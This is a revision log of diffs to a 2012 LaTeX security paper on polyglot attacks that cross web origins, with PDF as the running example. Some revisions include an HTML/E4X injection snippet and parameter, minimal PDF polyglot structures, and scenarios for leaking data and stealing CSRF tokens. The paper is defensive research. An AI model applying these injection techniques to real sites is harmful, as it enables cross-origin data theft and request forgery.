+a document can only directly communicate with the server from which it originated. 
+This is not to be confused with \emph{cross-origin resource sharing} (CORS)~\cite{w3-cors}, which is an 
+intentional relaxation of SOP.
 
@@
 are allowed to be included as resources across origins, access to these resources is 
-carefully restricted to prevent information leaks. As an example, the including 
+restricted to prevent information leaks. As an example, the including 
 document is prevented from accessing the image data of images loaded across 
@@
 with the document, e.g. by adding nodes, which in turn require new content to be 
-requested. Since these requests are not restricted by the SOP, this creates a side 
+requested. Since these requests are not restricted by SOP, this creates a side 
 channel that permits cross-origin information leakage. At the same time, the including document
@@
 
-Other examples of problematic elements include the object- and embed-tags. These 
+Other examples of problematic elements include the \emph{object} and
+\emph{embed} tags. These 
 tags allow inclusion of resources that might require a 
@@
 because the server delivering the content might not be able to determine its
-format, the object tag allows a developer to set the type-attribute to guide the
+format, the \emph{object} tag allows a developer to set the type-attribute to guide the
 browser in which plug-in to run. When the type attribute is used, the
@@
 
-A polyglot is defined as ``A person who knows several languages.'', and the term
-is widely used in various fields of science. In computer science, a \emph{polyglot} is
+A polyglot is perhaps most commonly known as a person who speaks several
+languages. However, the term
+is widely used in several scientific fields. In computer science, a \emph{polyglot} is
 a program that is valid in multiple programming languages. In this paper we use
@@
 languages either have a lot of constructs in common with other languages, such
-as \emph{C}, or are defined such that the parser ignores that which it cannot
-interpret, such as \emph{HTML}. The latter allows for ample opportunity to hide
+as the C language, or are defined such that the parser ignores that which it cannot
+interpret, such as HTML. The latter allows for ample opportunity to hide
 any code specific to another language, as long as there is no overlap with the
@@
 
-In a web context, coercing content to be interpreted as a different type be 
-done easily. If the content is loaded using an image-tag it will be interpreted 
-as an image, if a script-tag is used it will be interpreted as a script. Some 
+Coercing content to be interpreted
+as a different type can be accommodated in the context of the web. 
+If the content is loaded using an \emph{image} tag it will be interpreted 
+as an image, if a \emph{script} tag is used it will be interpreted as a script. Some 
 tags even let the developer decide which type to interpret the content as. 
@@
 We have identified two vectors in which malicious polyglots can be used for 
-exploitation; syntax injection, and content repurposing.
+exploitation: syntax injection and content repurposing.
 
@@
 of a different format, thereby creating a polyglot. The polyglot content can
-then be interpreted as either format; the benign original format, or the
+then be interpreted as either the benign original format or the
 malicious user-supplied format.
@@
 
-\todo{diagram}
+\todo{diagram with attack scenario. for example: with example domains attacker.com and
+  vulnerable.com leaking secret file secret.txt}
 The target in this scenario is a user of the vulnerable website. The polyglot is
@@
 As an example the
-same-origin policy allows a script-tag in one document to include JavaScript of
+same-origin policy allows a \emph{script} tag in one document to include JavaScript of
 another origin and execute it in the context of that document. If an attacker is
@@
 became valid JavaScript, the attacker can include the document across origins
-via a script-tag and extract its content, thereby circumventing the same-origin
+via a \emph{script} tag and extract its content, thereby circumventing the same-origin
 policy.
@@
 
-\todo{Mention and explain known attack instances}
+\todo{
+Mention and explain known attack instances.
+To what extent known attacks such as GIFAR follow this. if not
+  we should still mention them}
 
 \subsection{Content repurposing}
-\todo{diagram}
+\todo{diagram with attack scenario. for example: with example domains attacker.com and
+  vulnerable.com leaking secret file secret.txt}
 % Description of attack technique 
@@
 % Scenarios
-\todo{Mention and explain known attack instances}
+\todo{
+Mention and explain known attack instances.
+To what extent known attacks such as GIFAR follow this. if not
+  we should still mention them}
 
@@
 Section~\ref{sec:cross}, using the PDF format as the running example. We begin
-by detailing how the design decision made in the PDF-standard make it ideal 
+by detailing how the design decision made in the PDF-standard make it 
+highly suitable
 for creating malicious polyglots.
@@
 shows a sample of how a PDF file is structured and its elements.
+
+\begin{lstlisting}[label=lst:sample-pdf, caption=Sample PDF file]
+%PDF-1.7
+1 0 obj<</Type/Catalog/Pages<<>>>>
+endobj
+2 0 obj<</Length 13>>stream
+Sample Author
+endstream
+endobj
+xref
+0 3
+0000000000 65536 f
+0000000009 00000 n
+0000000057 00000 n
+trailer<</Root 1 0 R
+	/Info<</Author 2 0 R>>
+>>
+startxref
+118
+%%EOF
+\end{lstlisting}
 
@@
 
-\begin{lstlisting}[label=lst:sample-pdf, caption=Sample PDF file]
-%PDF-1.7
-1 0 obj<</Type/Catalog/Pages<<>>>>
-endobj
-2 0 obj<</Length 13>>stream
-Sample Author
-endstream
-endobj
-xref
-0 3
-0000000000 65536 f
-0000000009 00000 n
-0000000057 00000 n
-trailer<</Root 1 0 R
-	/Info<</Author 2 0 R>>
->>
-startxref
-118
-%%EOF
-\end{lstlisting}
-
 \subsection{PDF-based polyglots}
@@
 URL. This will unload the current page in which the document is embedded. Page 
-navigation is allowed wtih respect to the SOP, since the response is not visible 
+navigation is allowed wtih respect to SOP, since the response is not visible 
 to the document. Such methods can be used in CSRF attacks, but would 
@@
 \paragraph{Embedded Flash}
-Cross-origin communication in Flash is restricted by the Same-Origin Policy,
+Cross-origin communication in Flash is restricted by the same-origin policy,
 but also support cross-origin communication via Cross-Origin Resource Sharing 
-(CORS). Using CORS, a web server can relax the SOP to allow access to specified content.
+(CORS). Using CORS, a web server can relax SOP to allow access to specified content.
 As mentioned, the embedded Flash file inherits the origin of the document.
@@
 mismatch between the content-type provided by the server and the type attribute 
-of the object tag. By acknowledging that there can be a potential security issue in 
+of the \emph{object} tag. By acknowledging that there can be a potential security issue in 
 interpreting the supplied content in the requested format and alerting the user to this
@@
 
+Billy's and Jonas' anonimized demos?
+
 \end{document}

### 2012-11-30 main.tex
a few global edits

@@
 content and resources if they share the origin. Similarly,
-a document can only directly communicate with the server from which it originated. 
+a document can only directly communicate with the server from which it originates. 
 This is not to be confused with \emph{cross-origin resource sharing} (CORS)~\cite{w3-cors}, which is an 
@@
 origin of the including document, which allows the script to communicate with the 
-server from which the \emph{document} originated. Such scripts are also able to interact 
+server from which the \emph{document} originates. Such scripts are also able to interact 
 with the document, e.g. by adding nodes, which in turn require new content to be 
@@
 security issues.
-\todo{explain the issues and cite Barthe et al.}
+\todo{explain the issues and cite Barth et al.~\cite{Barth+:SP09}}
 
@@
 \subsubsection{The target}
-There are two methods for a PDF to communicate with the server it originated from, 
-that allow it to read the response; from JavaScript using XML external entities 
-or from an embedded flash file.
+There are two methods for a PDF file to communicate with the server it originates from, 
+both allowing it to read the response: from JavaScript using XML external entities 
+and from an embedded flash file.
 
@@
 Cross-origin communication in Flash is restricted by the same-origin policy,
-but also support cross-origin communication via Cross-Origin Resource Sharing 
-(CORS). Using CORS, a web server can relax SOP to allow access to specified content.
+but also support cross-origin communication via  
+CORS. Using CORS, a web server can relax SOP to allow access to specified content.
 As mentioned, the embedded Flash file inherits the origin of the document.
@@
 \subsection{Syntax injection}
-
 the minimal malformed structure that is required for Adobe Reader to consider ita PDF.
@@
 
-As for the PDF file format, the underlying design decisions has led to the 
+As for the PDF file format, the underlying design decisions have led to the 
 current parsing being very relaxed, even with respect to the specification. 
 Making the parsing more strict and enforcing many of the specified requirements 
-will reduce the attack surface. It is, however, not a complete 
-mitigation approach. Since the PDF format is a container format it is designed to 
+will reduce the attack surface. It is, however, not sufficient for complete 
+mitigation because the PDF format is a container format it is designed to 
 embed syntax from other files. Even when parsing strictly according to 

### 2012-11-30 main.tex
a few global edits
Minor revision

--- 2012-11-30 main.tex
@@
 the rise that exploit the mismatch between the expected and provided content.
+\emph{Injection attacks} are becoming increasingly more sophisticated by
+operating across multiple languages. \emph{Content repurposing} attacks supply
+malicious payload that appears formatted as benign content. 
 % 
-This paper identifies the root cause of a large class of attacks: \emph{polyglots}. 
+This paper focuses on the root cause of a large class of attacks: \emph{polyglots}. 
 A polyglot is a program that is valid in multiple programming languages. Polyglots allow
 multiple interpretation of the content, providing a new space of attack vectors.
-%
 We characterize of what constitutes a dangerous format in the web setting and
@@
 demonstrate that polyglot-based attacks on the web open up for insecure
-communication across Internet origins. 
-%
-The paper presents novel attack vectors that are based on
-\emph{syntax injection} that 
-operate across multiple languages and on \emph{content repurposing} that supply
-malicious payload that appears formatted as benign content. 
-%
-We perform a systematic study of
+communication across Internet origins. We perform a systematic study of
 PDF-based injection and content repurposing attacks. We evaluate the current
@@
 \label{sec:intro}
+
 Web application security is concerned with protecting information as
-it is manipulated by web applications. This is an important area
-because ``attacks against web
-applications constitute more than 60\% of the total attack attempts
-observed on the Internet''~\cite{SANS09}.
-
-\paragraph{Internet origins at stake}
-The different trust domains
+it is manipulated by web applications. The different trust domains
 correspond to different Internet origins. A major goal for web
@@
 today's browsers enforce the \emph{same-origin policy} (SOP). SOP
-only allows access between two documents if they share the
+restricts only allows access between two documents if they share the
 origin. In addition, a document can only directly communicate with the
@@
 
-\paragraph{Classical cross-domain attacks}
 There are several classes of cross-domain attacks that circumvent SOP.
-The OWASP top 10 list~\cite{OWASP:top10:2010} places \emph{injection}
+The OWASP top 10 list~\cite{OWASP:top10:10} places injection
 and \emph{cross-site scripting} (XSS) attacks as two top security
@@
 XSS attacks are relatively well understood by researchers and
-developers~\cite{XSSED}. Known defense include various
+developers~\cite{XSS:understood}. Known defense include various
 flavors of \emph{sanitization} on server side and the
-\emph{content security policy}~\cite{CSP1.0} (CSP) on client side. Sanitization
-is often performed by the server to filter possibly malicious input data
+\emph{content security policy} (CSP) on client side. Sanitization
+is often performed by the server which sanitizes input data
 before it is used in the generated web pages. Content security policy puts
@@
 
-\paragraph{Crossing origins by crossing formats}
 This paper identifies a new breed of attacks and its root cause:
 \emph{polyglots}. 
-%
-A polyglot is a program that is valid in multiple programming languages.
 %
@@
 
-Polyglots allow
+A polyglot is a program that is valid in multiple programming languages. Polyglots allow
 multiple interpretation of the content, providing a new space of attack vectors.
-We present novel attack vectors that are based on (i)
-\emph{syntax injection} that 
-operate across multiple languages and on (ii) \emph{content repurposing} that supply
-malicious payload that appears formatted as benign content.
-
 We characterize of what constitutes a dangerous format in the web setting and
@@
 communication across Internet origins. We perform a systematic study of
-PDF-based injection and content repurposing attacks.
-
-\paragraph{Evaluation and mitigation}
-We evaluate the current
+PDF-based injection and content repurposing attacks. We evaluate the current
 practice in client/server content filtering and PDF readers for polyglot-based
@@
 
-\paragraph{Contributions} The paper makes the following contributions:
-\begin{itemize}
-\vspace*{-.6cm}
-\item We identify polyglot attacks, a new breed of attacks for
-  crossing origins by crossing formats;
-\vspace*{-.2cm}
-\item We characterize the necessary ingredients for polyglot attacks
-\vspace*{-.2cm}
-\item We arrive at the PDF format as a particularly exposed format for
-  polyglot-based attacks;
-\vspace*{-.2cm}
-\item We present two novel attack vectors, based on syntax and
-  injection and content repurposing;
-\vspace*{-.2cm}
-\item We evaluate the current filtering mechanisms, browsers, and PDF
-  filters for vulnerabilities; and
-\vspace*{-.2cm}
-\item We propose mitigation for the server, client, and PDF readers.
-\end{itemize}
+\todo{Emphasize novel attack vectors}
 
-\paragraph{Overview}
-The paper is organized as follows. 
-%
-Section~\ref{sec:cross} explains the concept of crossing origins by
-crossing formats, identifies necessary ingredients, and provides
-attack scenarios.
-%
-Section~\ref{sec:vuln} focuses on the PDF format and describes
-concrete vulnerabilities and attacks.
-%
-Section~\ref{sec:eval} evaluates the current practice in client/server
-content filtering and PDF readers and report on vulnerabilities in the
-top 100 Alexa web sites.
-%
-Section~\ref{sec:mit} suggests mitigation for servers, clients, and
-PDF readers.
-%
-Section~\ref{sec:related} discusses the related work.
-%
-Section~\ref{sec:conc} concludes and outlines future work.
+\emph{Injection attacks} are becoming increasingly more sophisticated by
+operating across multiple languages. \emph{Content repurposing} attacks supply
+malicious payload that appears formatted as benign content.
+
+The paper is organized as follows...
 
@@
 well; a document can only directly communicate with the server from which it originated. 
-This is not to be confused with Cross-Origin Resource Sharing (CORS)~\cite{w3-cors}, which is an 
+This is not to be confused with Cross-Origin Resource Sharing (CORS)~\cite{CORS}, which is an 
 intentional relaxing of the SOP.
@@
 
-\todo{
-In literature we find Content repurposing, content smuggling,
-chameleon, gifar; say that we have called it content smuggling
-ourselves in case someone discovers the blog
-}
+%In literature we find Content repurposing, content smuggling, chameleon, gifar
 
@@
 by detailing how the design decision made in the PDF-standard make it ideal 
-for creating malicious polyglots.
+for creating malicious polyglots. Throughout this section Adobe Reader is the 
+assumed target. A comparison between readers can be found in Section~\ref{sec:eval}.
 
@@
 \section{Mitigation}
-\label{sec:mit}
+
 This section will describe our recommendations for mitigation in each of the
@@
 \section{Related work}
-\label{sec:related}
+
 Backes et al.~\cite{Backes+:SP07} explore the power of the PostScript
@@
 
-Wolf~ OMG WTF PDF talk at CCC in 2010.
-
 %1 page 
 \section{Conclusions}
-\label{sec:conc}
 We have put a spotlight on a new breed of attacks that smuggle

### 2012-11-30 main.tex
a few global edits

--- 2012-11-30 main.tex
@@
 Section~\ref{sec:cross}, using the PDF format as the running example. We begin
-by detailing how the design decision made in the PDF-standard make it 
-highly suitable
-for creating malicious polyglots.
+by detailing how the design decision made in the PDF-standard make it highly suitable
+for creating malicious polyglots. Throughout this section Adobe Reader is the 
+assumed target. A comparison between readers can be found in Section~\ref{sec:eval}.
 
@@
 
-\subsection{Embedded PDF documents}
-\todo{Not sure how well it fits here}
+%\subsection{Embedded PDF documents}
+%\todo{Not sure how well it fits here}
 When a PDF document is embedded in a web page, the corresponding plugin 
@@
 
-Billy's and Jonas' anonimized demos?
+Billy's and Jonas' anonymized demos?
 

### 2012-11-30 main.tex
update

@@
 }
+
+\todo{discuss the layout}
+
+\subsection{Infiltrating the origin}
+
+\subsubsection{Syntax injection}
+
+A form of injection attack.
+
+\subsubsection{Polyglot upload}
+
+A form of content repurposing attack.
+
+\subsection{Scenarios}
+
+After infiltrating an origin two lines of exploitation is available.
+
+\subsubsection{Cross-domain leakage}
+
+Extract sensitive information and send to attacker
+
+\subsubsection{Cross-site request forgery}
+
+Extract CSRF protection token and do CSRF attack, despite protection!
 
@@
 \subsection{Syntax injection}
-the minimal malformed structure that is required for Adobe Reader to consider ita PDF.
+
+Based on the minimal PDF sample in Listing~\ref{lst:minimal-pdf}, we can derive 
+the set of tokens required to build a PDF. Assuming that alpha-numeric characters pass through any filter unmodified, this set is ${\%, <<, >>, (, ), /}$.
 

### 2012-11-30 main.tex
a few global edits

@@
 %
-The paper presents novel attack vectors that are based on
-\emph{syntax injection} that 
-operate across multiple languages and on \emph{content repurposing} that supply
-malicious payload that appears formatted as benign content. 
+The paper presents novel attack vectors that infiltrate the trusted
+origin by \emph{syntax injection} across multiple languages and by
+\emph{content smuggling} of
+malicious payload that appears formatted as benign content. The
+attacks lead to both \emph{cross-domain leakage} and \emph{cross-site
+  request forgery}.
 %
 We perform a systematic study of
-PDF-based injection and content repurposing attacks. We evaluate the current
+PDF-based injection and content smuggling attacks. We evaluate the current
 practice in client/server content filtering and PDF readers for polyglot-based
@@
 recommendations for protective measures on server side, in browsers, and in content
-interpreters (such as PDF readers) show how to mitigate the attacks.
+interpreters (in particular, PDF readers) show how to mitigate the attacks.
 \end{abstract}
@@
 %
-The existing defense mechanisms fall short to prevent these attacks
-from achieving cross-domain communication.
 
@@
 \emph{syntax injection} that 
-operate across multiple languages and on (ii) \emph{content repurposing} that supply
-malicious payload that appears formatted as benign content.
-
-\todo{Say why sanitization and CSP are of no use}
-
-\todo{Mention GIFAR and perhaps other profile examples and say we're
-  the first to perform a systematic study}
-
+operate across multiple languages and on (ii) \emph{content smuggling} that supply
+malicious payload that appears formatted as benign content. The
+attacks lead to both \emph{cross-domain leakage} and \emph{cross-site
+  request forgery}.
+
+The existing defense mechanisms fall short to prevent these attacks
+from achieving cross-domain communication. 
+On the server side, santization is specific to the target language of
+the web application. Sanitizing unexpected formats is typically not considered.
+On the client side, CSP
+has no effect unless the content is interpreted as HTML. This opens up
+opportunities for attacks that are based on other formats.
+
+First steps in exploiting the formats in the context of the web have
+been by researchers. Two noteworthy examples are GIFAR~\cite{XXX} and
+cross-origin CSS attacks~\cite{YYY} (Section~\ref{sec:related}
+discusses further realted work). 
+%
+GIFAR is based on polyglots that combine the GIF and JAR (Java
+archive) formats. The former is used as benign and the latter as
+malicious to bypass SOP.
+%
+Cross-origin CSS attacks inject fragments of CSS code into an existing
+web page to extract information from the existing web page.
+%
+The paper is the first to perform a systematic study of polyglot
+attacks.
 We characterize of what constitutes a dangerous format in the web setting and
@@
 communication across Internet origins. We perform a systematic study of
-PDF-based injection and content repurposing attacks.
+PDF-based injection and content smuggling attacks.
 
@@
 \vspace*{-.6cm}
-\item We identify polyglot attacks, a new breed of attacks for
+\item Identification of polyglot attacks, a new breed of attacks for
   crossing origins by crossing formats;
 \vspace*{-.2cm}
-\item We characterize the necessary ingredients for polyglot attacks
+\item Characterization of the necessary ingredients for polyglot attacks
 \vspace*{-.2cm}
-\item We arrive at the PDF format as a particularly exposed format for
-  polyglot-based attacks;
+\item Highlighting the PDF format as a particularly exposed format for
+  polyglot attacks;
 \vspace*{-.2cm}
-\item We present two novel attack vectors, based on syntax and
-  injection and content repurposing;
+\item Novel confidentiality and integrity attack vectors, based on syntax 
+  injection and content smuggling;
 \vspace*{-.2cm}
-\item We evaluate the current filtering mechanisms, browsers, and PDF
+\item Evaluation of the current filtering mechanisms, browsers, and PDF
   filters for vulnerabilities; and
 \vspace*{-.2cm}
-\item We propose mitigation for the server, client, and PDF readers.
+\item Mitigation for the server, client, and PDF readers.
 \end{itemize}
@@
 We have identified two vectors in which malicious polyglots can be used for 
-exploitation: syntax injection and content repurposing.
+exploitation: syntax injection and content smuggling.
 
@@
 
-\subsubsection{Polyglot upload}
+\subsubsection{Content smuggling}
 
@@
 
-\subsection{Scenarios}
+\subsection{Exploiting the infiltrated origin}
 
@@
 
-\subsection{Content repurposing}
+\subsection{Content smuggling}
 \todo{diagram with attack scenario. for example: with example domains attacker.com and
@@
 % Description of attack technique 
-A content repurposing attack targets the users of a website
+A content smuggling attack targets the users of a website
 that allows and serves user supplied files. Examples are a file sharing
@@
 
-\subsection{Content repurposing}
+\subsection{Content smuggling}
 
@@
 on the kind of services provided. The mitigation recommendations for syntax 
-injection apply to services that rely on user input, and the content repurposing 
+injection apply to services that rely on user input, and the content smuggling
 recommendations apply to services that serve user-supplied files.
@@
 
-\subsubsection{Content repurposing}
+\subsubsection{Content smuggling}
 
@@
 Wolf~ OMG WTF PDF talk at CCC in 2010.
+
+PDFAR
 
@@
 \section*{Todo}
-Test page
-
-Billy's and Jonas' anonymized demos?
+Test page \url{http://internot.noads.biz} with Billy's and Jonas' anonymized demos?
 

### 2012-12-03 main.tex
Major restructure of section 2 and 3

@@
 % Malicious polyglots in literature; gifar, chameleon, cross-origin css attacks
-
-We have identified two vectors in which malicious polyglots can be used for 
-exploitation: syntax injection and content smuggling.
-
-%It is possible to create such a polyglot by mixing content, that is benign when
-%verified, with content, that is malicious when executed. The verification
-%process will see the benign content and allow it
-
 \todo{
@@
 
-\todo{discuss the layout}
-
-\subsection{Infiltrating the origin}
-
-\subsubsection{Syntax injection}
-
-A form of injection attack.
-
-\subsubsection{Content smuggling}
-
-A form of content repurposing attack.
-
-\subsection{Exploiting the infiltrated origin}
-
-After infiltrating an origin two lines of exploitation is available.
-
-\subsubsection{Cross-domain leakage}
-
-Extract sensitive information and send to attacker
-
-\subsubsection{Cross-site request forgery}
-
-Extract CSRF protection token and do CSRF attack, despite protection!
-
-\subsection{Syntax injection}
-
-% Description of attack technique
-
-In a cross-site scripting attack, HTML syntax is injected into a preexisting
-HTML document via vulnerable user supplied parameters. Similarly, a syntax
-injection attack consists of injecting foreign syntax into preexisting content
-of a different format, thereby creating a polyglot. The polyglot content can
-then be interpreted as either the benign original format or the
-malicious user-supplied format.
-
-% Attack building blocks
-
-% Browser, plug-in/content handler, target, vulnerability, server
+\subsection{Scenario}
 
@@
   vulnerable.com leaking secret file secret.txt}
-The target in this scenario is a user of the vulnerable website. The polyglot is
-served in the benign format on the vulnerable server. While the user is logged in to
-the service that the vulnerable website provides, the user unsuspectingly visits
-the attackers malicious website. The page embeds the polyglot content, but
-coerces the browser to interpret the content as the malicious format. 
-The capabilities of the malicious format determine the severity of the consequences.
-The attacker can
-exploit the vulnerability, either by making requests to the vulnerable website
-in the context of the user; or by extracting information about the user that is
-stored on the vulnerable website.
-
-In situations like these, the same-origin policy is intended to prevent a
-document from one origin from accessing the content of a document of another
-origin. However, depending on the capabilities of the malicious format used in
-the attack, it may be possible to circumvent the same-origin policy.
-
-For this attack to be successful certain requirements needs to be fulfilled.
-\begin{itemize} 
-	\item The original content must embed external information under the 
-	control of the attacker. 
-	\item The user-supplied content must circumvent any validation or 
-	filtering. 
-	\item There must exist a way of coercing the resulting polyglot to be 
-	interpreted as the malicious format. 
-	\item The malicious format must have capabilities that are restricted or 
-	missing in the benign format.
-\end{itemize}
-
-% Scenarios
-
-%Much like a cross-site scripting attack, we consider a scenario where a
-%website serves documents which are based upon user-supplied information.
-
-%The same-origin policy is intended to prevent a document from one origin from
-%accessing the content of a document of another origin. 
-As an example the
-same-origin policy allows a \emph{script} tag in one document to include JavaScript of
-another origin and execute it in the context of that document. If an attacker is
-able to inject an HTML document with JavaScript syntax in such a way that it
-became valid JavaScript, the attacker can include the document across origins
-via a \emph{script} tag and extract its content, thereby circumventing the same-origin
-policy.
-
-%Consider the php-program in listing \ref{lst:php-sample}. Apart from being
-%vulnerable to traditional cross-site scripting, it is vulnerable
-
-%By requesting the site with parameter $guess=</body></html>;x=<html><body>$,
-%the resulting document, 
-The document in Listing \ref{lst:html-js}, is both
-malformed but valid HTML and valid JavaScript in browsers that support
-EcmaScript for XML (E4X). \todo{ref}
-
-The
-document can be included as a script in another document and the secret can be
-extracted from variable x. 
-This implies that if an attacker is able to inject
-HTML syntax into a document, closing all previously open tags and
-opening all subsequently closed tags,
-then information can be extracted across origins.
-The injected HTML in the listing is illustrated by highlighting.
-
-\definecolor{lightgray}{gray}{.8}
-\begin{lstlisting}[label=lst:html-js, caption=HTML / E4X Polyglot, escapechar=*]
-<html><body>
-Hello *\colorbox{lightgray}{$<$/body$><$/html$>$;x=$<$html$><$body$>$}*!
-Your secret is 'safe with me'.
-</body></html>
-\end{lstlisting}
-
-This attack has been suggested as a potential way to bypass Content Security
-Policy~\cite{Heyes:CSP}. As E4X is only supported in the SpiderMonkey JavaScript
-engine, used in Firefox, this limits the exploitability of this example. However,
-this is an unlikely scenario to use JavaScript as the injected format
-because HTML characters are typically escaped by content
-filters. 
+The victim in these scenarios is an authenticated user of a targeted vulnerable website, \emph{vulnerable.com}. 
+The target is infiltrated by the attacker, manipulating the website to serve polyglot content. Vulnerable.com serves the polyglot content as the benign content type, harmless to the victim. 
+At a certain point, while still authenticated to vulnerable.com, 
+the victim unsuspectingly visits the attackers malicious website, \emph{attacker.com}.
+The attacker.com website embeds the polyglot content from vulnerable.com, but
+coerces the browser to interpret it as the malicious content type. 
+The capabilities of the malicious format determine the 
+severity of the consequences of exploitation.
+
+Two attacker-centric components requires special attention, the infiltration of 
+an origin and the exploitation of an infiltrated origin.
+%In this situation, the same-origin policy is intended to prevent cross-origin 
+%interaction.
+
+\subsection{Infiltrating an origin}
+
+Two vectors for infiltrating an origin has been identified, via syntax 
+injection, or content smuggling.
+
+\subsubsection{Syntax injection}
+
+In a cross-site scripting attack, a HTML document is composed from input 
+containing fragments of HTML syntax, causing the execution of attacker supplied 
+script code. Similarly, in a syntax injection attack the vulnerable target will 
+compose content from attacker controlled input containing syntax of a foreign 
+format, thereby creating a polyglot. 
+%
+The target is assumed to employ server-side cross-site scripting sanitization. Hence, for the attack to be successful, the input must 
+bypass this sanitization. The sanitization filter will remove or encode 
+problematic characters, based on the context of the web application. In a polyglot attack
+the injected format would pose as a new context, unknown to the filter. Chances are that the 
+key elements of the injected format will pass the filter unaltered. 
+The polyglot content can
+be interpreted as either the benign original format or the
+malicious attacker-supplied format. 
+%
+
+%As an example the
+%same-origin policy allows a \emph{script} tag in one document to include JavaScript of
+%another origin and execute it in the origin of the document. If an attacker is
+%able to inject an HTML document with JavaScript syntax in such a way that it
+%became valid JavaScript, the attacker can include the document across origins
+%via a \emph{script} tag and extract its content, thereby circumventing the same-origin
+%policy.
+
+%The document in Listing \ref{lst:html-js}, is both
+%malformed but valid HTML and valid JavaScript in browsers that support
+%EcmaScript for XML (E4X). \todo{ref} The
+%document can be included as a script in another document and the secret can be
+%extracted from variable x. 
+%This implies that if an attacker is able to inject
+%HTML syntax into a document, closing all previously open tags and
+%opening all subsequently closed tags,
+%then information can be extracted across origins.
+%The injected syntax in the listing is illustrated by highlighting.
+
+%This attack has been suggested as a potential way to bypass Content Security
+%Policy~\cite{Heyes:CSP}. As E4X is only supported in the SpiderMonkey JavaScript
+%engine, used in Firefox, this limits the exploitability of this example. However,
+%this is an unlikely scenario to use JavaScript as the injected format
+%because HTML characters are typically escaped by content
+%filters.
+
+Previous work documents instances of polyglot attacks based on syntax injection.
+Huang et al.~\cite{Huang+:CCS10} describe a cross-origin \emph{cascading style-sheet} (CSS) attack. This 
+attack injects fragments of CSS syntax in a HTML 
+document, thereby making it a HTML/CSS polyglot. The error-tolerant parsing of 
+style sheets allow the polyglot to parsed as valid CSS. The capabilities of CSS 
+provide trivial cross-origin leakage. The paper proposes a defense technique which has been
+adopted by all major browsers, which implies that the attacks outlined in the paper are now ineffective.
 Instead,
@@
 
-\todo{
-Mention and explain known attack instances.
-To what extent known attacks such as GIFAR follow this. if not
-  we should still mention them}
-
-\subsection{Content smuggling}
-\todo{diagram with attack scenario. for example: with example domains attacker.com and
-  vulnerable.com leaking secret file secret.txt}
-% Description of attack technique 
-A content smuggling attack targets the users of a website
-that allows and serves user supplied files. Examples are a file sharing
-service, an image database, or a job search service. Such a service 
+%\definecolor{lightgray}{gray}{.8}
+%\begin{lstlisting}[label=lst:html-js, caption=HTML / E4X Polyglot, escapechar=*]
+%<html><body>
+%Hello *\colorbox{lightgray}{$<$/body$><$/html$>$;x=$<$html$><$body$>$}*!
+%Your secret is 'safe with me'.
+%</body></html>
+%\end{lstlisting}
+
+\paragraph{Content smuggling}
+The vulnerable target of a polyglot attack based on content smuggling lets 
+users to submit files to the service which are then served under the origin of 
+the service. Examples of such services are file sharing services, image databases, 
+social networks or job broker services. Such a service 
 accepts a limited set of file-types, and the files are verified to
@@
 
+The Gifar attack is a polyglot attack based on content smuggling. In this attack 
+a benign GIF-image and a malicious JAR-file is combined to create a GIF/JAR 
+polyglot. By submitting the combined GIFAR to a service, the attacker can 
+execute a Java applet under the origin of the targeted service. The Java runtime 
+has been updated to prevent this kind of abuse.
+Instead,
+Section
+\ref{sec:vuln} will show practical attacks based on other formats.
+
+\subsection{Exploiting the infiltrated origin}
+
+The consequences of exploiting an infiltrated origin depend on the capabilities 
+of the format used. These consequences span from forging requests to the vulnerable website,
+abusing the credentials of the victim, to extracting sensitive information about the user that is
+stored on the vulnerable website.
+
+\paragraph{Cross-site request forgery}
+
+If the format has the capability of issuing requests, that includes the victims 
+credentials, within the boundaries of the SOP, then this constitutes a 
+\emph{cross-site request forgery} (CSRF) attack. Websites protect against these attacks by 
+generating a token with each response that has to be included in the subsequent 
+request. However, if the format also have the capability of reading the response 
+the issued request, it can extract the token and thereby circumvent the CSRF 
+protection.
+
+\paragraph{Cross-origin leakage}
+
+If the format also has the capability of communicating with the attacker, then 
+the attacker can sensitive user information and leak it across origins. If the 
+format is not restricted by the SOP, it can communicate directly with the 
+attackers server. Otherwise, if the format can interact with the document that 
+embeds the polyglot, the communication could be tunneled through this channel.
+
+%\subsection{Syntax injection}
+
+%For this attack to be successful certain requirements needs to be fulfilled.
+%\begin{itemize} 
+%	\item The original content must embed external information under the 
+%	control of the attacker. 
+%	\item The user-supplied content must circumvent any validation or 
+%	filtering. 
+%	\item There must exist a way of coercing the resulting polyglot to be 
+%	interpreted as the malicious format. 
+%	\item The malicious format must have capabilities that are restricted or 
+%	missing in the benign format.
+%\end{itemize}
+
+% Scenarios
+
+%Much like a cross-site scripting attack, we consider a scenario where a
+%website serves documents which are based upon user-supplied information.
+
+%The same-origin policy is intended to prevent a document from one origin from
+%accessing the content of a document of another origin.
+
+%Consider the php-program in listing \ref{lst:php-sample}. Apart from being
+%vulnerable to traditional cross-site scripting, it is vulnerable
+
+%By requesting the site with parameter $guess=</body></html>;x=<html><body>$,
+%the resulting document,
+
+%\subsection{Content smuggling}
+% Description of attack technique
+
 % Building blocks
 
-The difference in this scenario from the previous one is in the nature of the
-vulnerability. Where in the previous scenario an existing document was injected
-to become a polyglot, this scenario targets services which allow an attacker to
-introduce new documents. As in the previous scenario, the target is a user of
-the vulnerable website.
-
-For this attack to be successful, certain requirements needs to be fulfilled.
-\begin{itemize} 
-	\item The service must accept and serve user-supplied files.
-	\item The service must verify the user-supplied polyglot under the 
-	assumption that it is in the benign format. 
-	\item The content is served under the same origin as sensitive user 
-	information.
-	\item There must exist a way of coercing the polyglot to be interpreted 
-	as the malicious format. 
-\end{itemize}
+%The difference in this scenario from the previous one is in the nature of the
+%vulnerability. Where in the previous scenario an existing document was injected
+%to become a polyglot, this scenario targets services which allow an attacker to
+%introduce new documents. As in the previous scenario, the target is a user of
+%the vulnerable website.
+
+%For this attack to be successful, certain requirements needs to be fulfilled.
+%\begin{itemize} 
+%	\item The service must accept and serve user-supplied files.
+%	\item The service must verify the user-supplied polyglot under the 
+%	assumption that it is in the benign format. 
+%	\item The content is served under the same origin as sensitive user 
+%	information.
+%	\item There must exist a way of coercing the polyglot to be interpreted 
+%	as the malicious format. 
+%\end{itemize}
 
 % Scenarios
-\todo{
-Mention and explain known attack instances.
-To what extent known attacks such as GIFAR follow this. if not
-  we should still mention them}
 
@@
 
-\begin{lstlisting}[label=lst:minimal-pdf, caption=Minimal PDF file]
-%PDF-
-trailer<</Root<</Pages<<>>>>>>
-\end{lstlisting}
-
 %\subsection{Embedded PDF documents}
@@
 
+\begin{lstlisting}[label=lst:minimal-pdf, caption=Minimal PDF file]
+%PDF-
+trailer<</Root<</Pages<<>>>>>>
+\end{lstlisting}
+
+\subsection{Syntax injection}
+
